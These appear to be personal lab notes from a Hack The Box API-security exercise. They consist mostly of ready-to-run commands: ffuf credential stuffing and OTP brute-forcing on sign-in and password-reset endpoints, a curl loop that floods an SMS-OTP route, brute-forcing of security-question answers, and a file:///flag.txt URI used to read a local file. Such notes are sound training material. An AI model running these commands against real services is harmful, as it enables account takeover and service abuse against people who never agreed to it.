
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
```
ffuf -w xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://154.57.164.82:30999/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
-after finding the email initiate a password reset and the use ffuf to trigger a password reset and guess the otp

```
ffuf -w tokens.txt:TOKEN -u http://154.57.164.82:30999/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "TOKEN", "NewPassword": "qwerasdfzxcv123"}' 
```

Unrestricted Resource Consumption
```
for i in $(seq 1 100);  do curl -X 'POST' 'http://154.57.164.65:30580/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{
  "Email": "htbpentester8@pentestercompany.com"
}'; done

```

**BOLA** stands for Broken Object Level Authorization
BFLA Broken Function Level Authorization
https://hackmd.io/@0IcPLP0CTHKb8RbHp8Vr6g/H1GWbqV8-l

Assessment
-find the users who have a security question set and send their emails to a file
```
jq -r '.suppliers[] | select(.securityQuestion != "SupplierDidNotProvideYet") | .email' response_1789116772969.json > filtered_emails.txt

```
-download the colors wordlist https://github.com/imsky/wordlists/blob/master/adjectives/colors.txt
```
ffuf -w colors.txt:colors -w filtered_emails.txt:email -u http://154.57.164.82:30222/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H 'Content-Type: application/json'   -d '{
  "SupplierEmail": "email",
  "SecurityQuestionAnswer": "colors",
  "NewPassword": "1234"
}'

```
-find the post /api/v2/suppliers/current-user and update the uri to file:///flag.txt
-sent the getcvinbase64 and base64 decode